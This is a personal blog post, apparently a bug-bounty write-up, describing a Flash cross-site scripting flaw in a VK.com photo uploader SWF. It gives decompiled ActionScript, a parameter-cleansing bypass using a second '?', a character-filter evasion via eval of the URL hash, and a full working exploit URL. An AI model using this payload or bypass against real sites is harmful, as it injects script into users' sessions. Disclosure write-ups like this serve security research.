<!DOCTYPE html>
<html lang="en">
<head>
          <title>bharadwaj.machiraju</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta charset="utf-8" />
        <link href="https://tunnelshade.in/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="bharadwaj.machiraju Full Atom Feed" />


    <meta name="tags" content="info" />


        <!-- CSS -->
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css" integrity="sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w" crossorigin="anonymous">
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css" integrity="sha384-b92sF+wDNTHrfEtRaYo+EpcA8FUyHOSXrdxKc9XB9kaaX1rSQAgMevW6cYeE5Bdv" crossorigin="anonymous">
        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
        <link rel="stylesheet" href="https://tunnelshade.in/theme/css/main.css">
        <!-- End CSS -->
  <link rel="stylesheet" href="https://tunnelshade.in/theme/css/blog.css">

        <!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
       m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
         })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-40078808-2', 'tunnelshade.in');
  ga('send', 'pageview');
</script></head>

<body id="index" class="home">
  <br>
  <div class="pure-g">
    <div class="pure-u-2-24"></div>
    <div class="pure-u-20-24">
      <div class="pure-g">
        <div class="pure-u-md-20-24 pure-u-lg-20-24 pure-u-sm-24-24" style="display: flex; align-items: center;">
            <h1>
              <a href="https://tunnelshade.in/">bharadwaj.machiraju </a>   &raquo; <a href="https://tunnelshade.in/blog/index.html">Blog</a> <a href="https://tunnelshade.in/feeds/all.atom.xml"><i class="fa fa-rss"></i></a>
            </h1>
        </div>
        <div class="pure-u-md-4-24 pure-u-lg-4-24 pure-u-sm-0-24" style="display: flex; align-items: center;">
          <img class="logo" src="https://tunnelshade.in/theme/images/logo.png"/>
        </div>
      </div>
      <br>
      <hr>
      <br>
      <div class="pure-g">
  <div class="pure-g">
    <div class="pure-u-1 pure-u-md-4-5 pure-u-lg-4-5">
<section id="content" class="body">
  <header class="pure-g"><div class="pure-u-1">
    <h2 class="entry-title">
      <a href="https://tunnelshade.in/blog/2015/09/interesting-flash-xss-on-vkcom/" rel="bookmark"
         title="Permalink to Interesting flash xss on vk.com">Interesting flash xss on vk.com</a></h2>
  </div></header>
  <footer class="pure-g"><div class="pure-u-1">

    <time class="published" datetime="2015-09-30T00:00:00+05:30">
      [30-09-15]
    </time>

    [<a href="/category/bugs/">Bugs</a>]

    [info]

  </div></footer><!-- /.post-info -->
  <div class="pure-g"><div class="pure-u-1">
    <p>Every time I try a bug bounty program on <strong>HackerOne</strong>, I first check for flash files on the domains which are in scope. Flash files are always
a good target as far as I am concerned. Approximately three months back, I came across <strong>VK.com</strong> bug bounty. So, when I searched for flash files
I came across one file named <strong>photo_uploader_lite.swf</strong>. So, I opened the file in my browser and the file got downloaded instead of getting played
in the browser. I ran curl to check the response headers and body.</p>
<div class="highlight"><pre><span></span>$ curl -i http://vk.com/swf/photo_uploader_lite.swf

HTTP/1.1 <span class="m">200</span> OK
Server: Apache
Date: Wed, <span class="m">30</span> Sep <span class="m">2015</span> <span class="m">14</span>:14:31 GMT
Content-Type: application/zip
Content-Length: <span class="m">12189</span>
Last-Modified: Tue, <span class="m">21</span> Jul <span class="m">2015</span> <span class="m">16</span>:43:33 GMT
Connection: keep-alive
ETag: <span class="s2">&quot;55ae76b5-2f9d&quot;</span>
Expires: Sun, <span class="m">04</span> Oct <span class="m">2015</span> <span class="m">14</span>:14:31 GMT
Cache-Control: max-age<span class="o">=</span><span class="m">345600</span>
Accept-Ranges: bytes
</pre></div>


<p>The file was being served with content type <code>application/zip</code>. When I saw the first few bytes of the flash files I recognized the <strong>CWS</strong> file
header which is present for compressed flash files. This flash file will work as expected when embedded using an <em>object</em> or <em>embed</em> tag. But for a flash
xss, you cannot embed swf on your domain (No actionscript methods were exposed to JS). At this point of time, I lost hopes but still wanted to
have a look at the decompiled code. The following snippet only consists of the interesting code segments for better readability.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">package</span> <span class="p">{</span>
    <span class="c1">// some imports</span>
    <span class="kd">class</span> <span class="nx">ExternalCall</span> <span class="p">{</span>
        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">function</span> <span class="nx">Simple</span><span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">String</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
            <span class="nx">Call</span><span class="p">(</span><span class="nx">_arg1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">function</span> <span class="nx">Call</span><span class="p">(...</span> <span class="nx">_args</span><span class="p">)</span><span class="o">:</span><span class="nb">Boolean</span><span class="p">{</span>
            <span class="k">var</span> <span class="nx">_local2</span><span class="o">:</span><span class="nb">Array</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">_local3</span><span class="o">:</span><span class="nb">RegExp</span><span class="o">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">available</span><span class="p">){</span>
                <span class="nx">_local2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">_args</span> <span class="nx">as</span> <span class="nb">Array</span><span class="p">);</span>
                <span class="nx">_local3</span> <span class="o">=</span> <span class="sr">/[^().a-z0-9_]/gi</span><span class="o">;</span>
                <span class="nx">_local2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_local2</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="nx">_local3</span><span class="o">,</span> <span class="s2">&quot;&quot;</span><span class="p">);</span>
                <span class="k">return</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="o">,</span> <span class="nx">_local2</span><span class="p">));</span>
            <span class="p">};</span>
            <span class="k">return</span> <span class="p">(</span><span class="kc">false</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="kd">package</span> <span class="p">{</span>
    <span class="c1">// some imports</span>
    <span class="kd">public</span> <span class="kd">class</span> <span class="nx">Main</span> <span class="kd">extends</span> <span class="nb">Sprite</span> <span class="p">{</span>

        <span class="kd">public</span> <span class="kd">function</span> <span class="nx">Main</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
            <span class="kd">super</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">stage</span><span class="p">){</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">init</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">init</span><span class="p">);</span>
            <span class="p">};</span>
        <span class="p">}</span>
        <span class="kd">private</span> <span class="kd">function</span> <span class="nx">init</span><span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
            <span class="k">var</span> <span class="nx">mouseMove</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">mouseOut</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">_arg1</span><span class="o">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">some_mouse_over_condition</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">mouseOver</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">var</span> <span class="nx">mouseOver</span><span class="o">:*</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
                <span class="nx">ExternalCall</span><span class="p">.</span><span class="nx">Simple</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">onMouseOver</span><span class="p">);</span>
                <span class="nx">stage</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">MOUSE_LEAVE</span><span class="o">,</span> <span class="nx">mouseOut</span><span class="p">);</span>
                <span class="nx">insideFrame</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
            <span class="p">};</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">package</span> <span class="p">{</span>
    <span class="c1">// some imports</span>

    <span class="kd">public</span> <span class="kd">class</span> <span class="nx">Config</span> <span class="p">{</span>

        <span class="kd">private</span> <span class="kd">static</span> <span class="k">var</span> <span class="nx">_config</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="p">{</span>
            <span class="c1">// ... some params ...</span>
            <span class="nx">onMouseOver</span><span class="o">:</span><span class="s2">&quot;debugLog&quot;</span><span class="o">,</span>
            <span class="c1">// ... some more params ...</span>
        <span class="p">};</span>

        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">function</span> <span class="nx">loadConfig</span><span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">LoaderInfo</span><span class="p">)</span><span class="o">:</span><span class="nb">Object</span><span class="p">{</span>
            <span class="k">var</span> <span class="nx">parameters</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">urlQuery</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">urlVars</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">key</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="k">var</span> <span class="nx">loaderInfo</span><span class="o">:*</span> <span class="o">=</span> <span class="nx">_arg1</span><span class="o">;</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="nx">loaderInfo</span> <span class="o">=</span> <span class="nb">LoaderInfo</span><span class="p">(</span><span class="nx">loaderInfo</span><span class="p">);</span>
                <span class="nx">parameters</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="o">;</span>
                <span class="nx">urlQuery</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
                <span class="nx">urlVars</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLVariables</span><span class="p">(((</span><span class="nx">urlQuery</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)));</span>
                <span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">urlVars</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">parameters</span><span class="p">[</span><span class="nx">key</span><span class="p">]){</span>
                        <span class="nx">delete</span> <span class="nx">parameters</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
                    <span class="p">};</span>
                <span class="p">};</span>
                <span class="nx">setConfig</span><span class="p">(</span><span class="nx">parameters</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="o">:</span><span class="nb">Error</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">};</span>
            <span class="k">return</span> <span class="p">(</span><span class="nx">_config</span><span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>

<p>The cleansing of parameters object was being done in the method <strong>loadConfig</strong>. So, any parameter provided in the url is removed from the parameters object.
This looked to me like a protection against flash xss because in a legitimate embed scenario parameters are provided through the <strong>param</strong> html tag. Ideally,
this is a really good way but they forgot something. Have a look at <strong>line 66</strong>. They are extracting url parameters by <code>loaderInfo.url.split("?")[1]</code>. What
if the url is something like</p>
<div class="highlight"><pre><span></span>http://vk.com/swf/photo_uploader_lite.swf?h=h?&amp;param1=value1
</pre></div>


<p>As far as flash player is concerned the parameters object will have the following values</p>
<div class="highlight"><pre><span></span>h = h?
param1 = value1
</pre></div>


<p>But the url parameters extracted by swf will have the following values (as they are considering only 1 index element after splitting)</p>
<div class="highlight"><pre><span></span>h = h
</pre></div>


<p>So, when they try to remove url parameters from the flash parameters object, only <code>h</code> gets removed but not <code>param1</code>. So, we successfully got our
url parameter to stay intact in the parameters object. Cool. <strong>Line 39</strong> has a call to <code>ExternalCall.Simple</code> with argument <code>config[onMouseOver]</code>. Now
ideally if you put anything like <code>alert(1)</code>, <code>confirm(1)</code> etc.. it will work. For me a bug is something which can be exploitable. Our next challenge
lies at <strong>line 12</strong>. The only allowed characters in your javascript call are <code>a-z</code>,<code>0-9</code>,<code>(</code>,<code>)</code>,<code>.</code>,<code>_</code>. Javascript strings are common part of any
useful payload, but quotes are filtered here. <code>,</code> is not allowed which prevents usage of <code>String.fromCharCode</code>. <code>window.location.hash</code> came to my mind. So,
a working payload will be</p>
<div class="highlight"><pre><span></span><span class="nb">eval</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</pre></div>


<p>Now you can place any js code in the fragment part of the url. All this is awesome, but the file is not played by the browser as of now because of the content
type. In this desperate time, my old friend <strong>IE</strong> came to my rescue. If you carefully observe the response headers there is no <code>X-Content-Type-Options</code>.
So, when I opened the url in IE, KABOOOOM!!! It sniffed the content type and played the flash file. Ah, the bug is finally exploitable but only in <strong>IE</strong></p>
<div class="highlight"><pre><span></span><span class="nt">http</span><span class="o">://</span><span class="nt">vk</span><span class="p">.</span><span class="nc">com</span><span class="o">/</span><span class="nt">swf</span><span class="o">/</span><span class="nt">photo_uploader_lite</span><span class="p">.</span><span class="nc">swf</span><span class="o">?</span><span class="nt">h</span><span class="o">=</span><span class="nt">h</span><span class="o">?&amp;</span><span class="nt">onMouseOver</span><span class="o">=</span><span class="nt">eval</span><span class="o">(</span><span class="nt">window</span><span class="p">.</span><span class="nc">location</span><span class="p">.</span><span class="nc">hash</span><span class="p">.</span><span class="nc">substr</span><span class="o">(</span><span class="nt">1</span><span class="o">))</span><span class="p">#</span><span class="nn">alert</span><span class="o">(</span><span class="nt">document</span><span class="p">.</span><span class="nc">domain</span><span class="o">);</span>
</pre></div>


<p>A different payload is in the image</p>
<p><img alt="vk.com Flash XSS" src="https://i.imgur.com/wBhOE51.png?1"></p>
<p><strong>HackerOne Report is present <a href="https://hackerone.com/reports/66121">here</a></strong> (Not public at the time of writing)</p>
  </div></div><!-- /.entry-content -->
</section>

<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://tunnelshade.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>    </div>
    <div class="pure-u-1 pure-u-md-1-5 pure-u-lg-1-5 blog_sidebar">
      <strong>Categories</strong>
      <ul>
          <li><a href="/category/bugs/">Bugs</a> [6]</li>
          <li><a href="/category/hacks/">Hacks</a> [2]</li>
          <li><a href="/category/information/">Information</a> [5]</li>
          <li><a href="/category/linux/">Linux</a> [7]</li>
          <li><a href="/category/python/">Python</a> [4]</li>
          <li><a href="/category/tools/">Tools</a> [10]</li>
      </ul>

      <br>

      <strong>Tags</strong>
      <ul>
          <li><a href="/tag/fuzzing/">fuzzing</a> [2]</li>
          <li><a href="/tag/reversing/">reversing</a> [3]</li>
          <li><a href="/tag/afl/">afl</a> [2]</li>
          <li><a href="/tag/tricks/">tricks</a> [11]</li>
          <li><a href="/tag/info/">info</a> [12]</li>
          <li><a href="/tag/python/">python</a> [3]</li>
          <li><a href="/tag/tools/">tools</a> [10]</li>
          <li><a href="/tag/hacks/">hacks</a> [5]</li>
          <li><a href="/tag/conference/">conference</a> [2]</li>
          <li><a href="/tag/linux/">linux</a> [5]</li>
          <li><a href="/tag/owtf/">owtf</a> [3]</li>
          <li><a href="/tag/screenshots/">screenshots</a> [3]</li>
      </ul>

      <br>

      <strong>Author</strong>
<ul class="no_bullets">
    <li><a class="no_underline" href="https://twitter.com/tunnelshade_"><i class="fa fa-twitter"></i> @tunnelshade_</a></li>
    <li><a class="no_underline" href="https://github.com/tunnelshade"><i class="fa fa-github"></i> Github</a></li>
    <li><a class="no_underline" href="https://in.linkedin.com/pub/bharadwaj-machiraju/45/109/38/"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
    <li><a class="no_underline" href="domain@gmail.com"><i class="fa fa-envelope"></i> domain@gmail.com</a></li>
</ul>
    </div>
  </div>
      </div>
    </div>
    <div class="pure-u-2-24"></div>
  </div>
</body>
</html>